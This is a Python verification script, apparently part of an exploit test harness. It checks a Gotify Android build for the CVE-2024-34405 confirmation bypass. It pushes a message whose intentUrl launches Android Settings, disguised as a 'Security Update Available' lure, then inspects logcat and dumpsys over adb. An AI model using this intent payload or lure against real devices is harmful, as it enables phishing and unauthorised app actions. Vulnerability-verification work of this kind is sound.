#!/usr/bin/env python3
"""
Gotify Intent URL Confirmation Bypass — Verification Helper

Checks whether the vulnerability allows arbitrary intents to be launched
bypassing the confirmation dialog (CVE-2024-34405).

Two checks are performed:

1. SETTINGS INTENT CHECK — The exploit sends a push message with an
   intentUrl targeting the Android Settings app. On the VULNERABLE build,
   Intent.parseUri() + startActivity() is called with the Settings component.
   On the CLEAN build, IntentUrlDialogActivity is launched instead.

   Verification uses two methods (in order):
   a) `adb shell dumpsys activity activities` — checks if Settings is the
      resumed activity (direct launch may work with SYSTEM_ALERT_WINDOW).
   b) System logcat — checks for ActivityTaskManager entries showing that
      the Gotify app attempted to start com.android.settings. This is
      system-written (not app-writable), same approach as Termux vuln_0.
      Even if the activity start is blocked by background restrictions,
      the system still logs the attempt.

2. MESSAGE CHECK — Queries the Gotify server for messages containing the
   exploit's intentUrl marker. This confirms the malicious push message
   was actually sent.

Both must be true: the exploit message was sent AND the Settings intent
was detected.

Exit codes:
    0 — NOT VULNERABLE: no Settings intent detected
    1 — VULNERABLE: Settings intent was attempted (dialog bypassed)
"""
import json
import os
import subprocess
import sys
import time

import requests

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
GOTIFY_SERVER = "http://127.0.0.1:8080"
GOTIFY_USER = None  # Set from metadata.json
GOTIFY_PASS = None  # Set from metadata.json
PACKAGE = "com.github.gotify"

# The intent URL that targets Android Settings via Intent.parseUri().
SETTINGS_INTENT_URL = "intent:#Intent;component=com.android.settings/.Settings;end"

# Marker to find the exploit message on the server
EXPLOIT_CALLBACK_MARKER = "com.android.settings"

# What we look for in dumpsys activity and logcat
SETTINGS_MARKER = "com.android.settings"


# ---------------------------------------------------------------------------
# ADB helpers
# ---------------------------------------------------------------------------
def _adb(*args, timeout=15):
    """Run an adb command and return the CompletedProcess."""
    return subprocess.run(
        ["adb", *args],
        capture_output=True,
        text=True,
        timeout=timeout,
    )


def _get_resumed_activity():
    """Query dumpsys for the currently resumed activity."""
    result = _adb("shell", "dumpsys", "activity", "activities")
    for line in result.stdout.split("\n"):
        stripped = line.strip()
        if stripped.startswith("ResumedActivity:") or stripped.startswith(
            "topResumedActivity="
        ):
            return stripped
        if "mResumedActivity" in stripped:
            return stripped
    return None


# ---------------------------------------------------------------------------
# Check 1: Verify Settings intent was attempted
# ---------------------------------------------------------------------------
def _get_or_create_app_token():
    """Return an application token we can use to push messages."""
    resp = requests.get(
        f"{GOTIFY_SERVER}/application",
        auth=(GOTIFY_USER, GOTIFY_PASS),
        timeout=10,
    )
    if resp.ok:
        apps = resp.json()
        if apps:
            return apps[0]["token"]

    resp = requests.post(
        f"{GOTIFY_SERVER}/application",
        auth=(GOTIFY_USER, GOTIFY_PASS),
        json={
            "name": "VerifyApp",
            "description": "Temporary app for verification",
        },
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()["token"]


def _send_settings_intent_message(app_token):
    """Push a message whose intentUrl targets the Settings app."""
    payload = {
        "title": "Security Update Available",
        "message": "Tap to install the latest patch.",
        "priority": 5,
        "extras": {
            "android::action": {
                "onReceive": {
                    "intentUrl": SETTINGS_INTENT_URL,
                }
            }
        },
    }
    resp = requests.post(
        f"{GOTIFY_SERVER}/message",
        headers={"X-Gotify-Key": app_token},
        json=payload,
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()


def _check_logcat_for_settings_intent():
    """Check system logcat for Settings activity start attempts.

    When startActivity() is called, the Android system (ActivityTaskManager)
    logs the intent details. This is a system-written log, not app-writable.
    Even if the activity start is blocked by background restrictions, the
    system still logs the attempt.

    On the VULNERABLE build, the log shows:
      ActivityTaskManager: START u0 {cmp=com.android.settings/.Settings}
      (or a "Background activity start" blocked message with the same intent)

    On the CLEAN build, the log shows:
      ActivityTaskManager: START u0 {cmp=com.github.gotify/.IntentUrlDialogActivity}
      (no mention of com.android.settings)

    Returns True if the Gotify app attempted to start a Settings activity.
    """
    result = _adb("shell", "logcat", "-d", "-b", "all", "-v", "brief")
    if result.returncode != 0:
        print("[check_url] ERROR: logcat command failed")
        return False

    lines = result.stdout.split("\n")
    settings_lines = []

    for line in lines:
        # Look for ActivityTaskManager or ActivityManager entries
        # that mention com.android.settings AND are from/about Gotify
        if SETTINGS_MARKER not in line:
            continue
        if "ActivityTaskManager" in line or "ActivityManager" in line:
            # Verify this is related to Gotify (not a manual Settings launch)
            if PACKAGE in line or "startActivity" in line.lower():
                settings_lines.append(line.strip())
            # Also match START entries with the Settings component
            elif "START" in line and "cmp=" in line:
                settings_lines.append(line.strip())
            # Match background activity start blocked messages
            elif "Background" in line and "activity" in line.lower():
                settings_lines.append(line.strip())

    if settings_lines:
        print(
            f"[check_url] Found {len(settings_lines)} logcat entries for Settings intent:"
        )
        for line in settings_lines[:5]:
            print(f"[check_url]   {line}")
        return True

    print(
        "[check_url] No ActivityTaskManager entries for Settings intent found in logcat"
    )
    return False


def trigger_and_check_settings():
    """Send a message and check if the Settings intent was attempted.

    Steps:
    1. Clear logcat to avoid stale entries
    2. Send a push message with intentUrl targeting Settings
    3. Wait for the app to process the message
    4. Check dumpsys activity for Settings as resumed activity
    5. Check system logcat for Settings intent attempt

    Returns True if Settings intent was detected (vulnerable).
    """
    print("[check_url] --- Settings Intent Check ---")

    # Clear logcat before sending the message
    print("[check_url] Clearing logcat...")
    _adb("shell", "logcat", "-c")
    time.sleep(1)

    try:
        token = _get_or_create_app_token()
        print(f"[check_url] Obtained app token: {token[:8]}...")

        print("[check_url] Sending push message with Settings intentUrl...")
        msg = _send_settings_intent_message(token)
        print(f"[check_url] Message sent (id={msg.get('id')})")

        print("[check_url] Waiting 5 seconds for app to process message...")
        time.sleep(5)

    except requests.exceptions.ConnectionError as e:
        print(
            f"[check_url] ERROR: Cannot connect to Gotify server: {e}",
            file=sys.stderr,
        )
        return False
    except Exception as e:
        print(f"[check_url] ERROR sending message: {e}", file=sys.stderr)
        return False

    # Method A: Check if Settings is the resumed activity (direct launch)
    resumed = _get_resumed_activity()
    if resumed:
        print(f"[check_url] Current resumed activity: {resumed}")
        if SETTINGS_MARKER in resumed:
            print("[check_url] Settings is the resumed activity (direct launch worked)")
            return True
    else:
        print("[check_url] Could not determine resumed activity")

    # Method B: Check system logcat for Settings intent attempt
    print("[check_url] Checking system logcat for Settings intent attempt...")
    if _check_logcat_for_settings_intent():
        print("[check_url] System logcat confirms Settings intent was attempted")
        return True

    print("[check_url] No evidence of Settings intent attempt found")
    return False


# ---------------------------------------------------------------------------
# Check 2: Did the exploit send the malicious message?
# ---------------------------------------------------------------------------
def detect_exploit_message():
    """Check if the Gotify server has a message with the exploit's intentUrl.

    Queries the Gotify REST API for messages and looks for ones containing
    the exploit's callback URL marker.

    Returns True if an exploit message is found on the server.
    """
    print("[check_url] --- Message Check ---")

    try:
        resp = requests.get(
            f"{GOTIFY_SERVER}/message",
            auth=(GOTIFY_USER, GOTIFY_PASS),
            timeout=10,
        )
        if not resp.ok:
            print(
                f"[check_url] ERROR: Failed to query messages: {resp.status_code}",
                file=sys.stderr,
            )
            return False

        data = resp.json()
        messages = data.get("messages", [])
        print(f"[check_url] Found {len(messages)} message(s) on server")

        for msg in messages:
            extras = msg.get("extras", {})
            android_action = extras.get("android::action", {})
            on_receive = android_action.get("onReceive", {})
            intent_url = on_receive.get("intentUrl", "")

            if EXPLOIT_CALLBACK_MARKER in intent_url:
                print(
                    f"[check_url] Found exploit message "
                    f"(id={msg.get('id')}): intentUrl={intent_url}"
                )
                return True

        print(
            f"[check_url] No messages with '{EXPLOIT_CALLBACK_MARKER}' "
            "in intentUrl found"
        )
        return False

    except requests.exceptions.ConnectionError as e:
        print(
            f"[check_url] ERROR: Cannot connect to Gotify server: {e}",
            file=sys.stderr,
        )
        return False


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    global GOTIFY_USER, GOTIFY_PASS

    script_dir = os.path.dirname(os.path.abspath(__file__))
    metadata_path = os.path.join(script_dir, "../../../metadata.json")

    try:
        with open(metadata_path, "r") as f:
            metadata = json.load(f)
        GOTIFY_USER = metadata["username"]
        GOTIFY_PASS = metadata["password"]
    except (FileNotFoundError, KeyError) as e:
        print(
            f"[check_url] Error reading metadata.json: {e}",
            file=sys.stderr,
        )
        sys.exit(1)

    # Check 1: Was Settings intent attempted?
    settings_detected = trigger_and_check_settings()

    # Check 2: Did the exploit send the malicious message?
    exploit_message_found = detect_exploit_message()

    # Report results
    print("[check_url] --- Results ---")
    print(f"[check_url] Settings intent detected:      {settings_detected}")
    print(f"[check_url] Exploit message on server:     {exploit_message_found}")

    if settings_detected and exploit_message_found:
        print(
            "[check_url] VULNERABLE: exploit message was sent AND Settings "
            "intent was detected (confirmation dialog bypassed)"
        )
        sys.exit(1)
    elif exploit_message_found and not settings_detected:
        print(
            "[check_url] NOT VULNERABLE: exploit message exists but Settings "
            "intent was not detected (confirmation dialog intact)"
        )
        sys.exit(0)
    elif settings_detected and not exploit_message_found:
        print(
            "[check_url] NOT VULNERABLE: Settings intent detected but no "
            "exploit message found (cannot confirm exploit)"
        )
        sys.exit(0)
    else:
        print(
            "[check_url] NOT VULNERABLE: no exploit message and no "
            "Settings intent detected"
        )
        sys.exit(0)


if __name__ == "__main__":
    main()
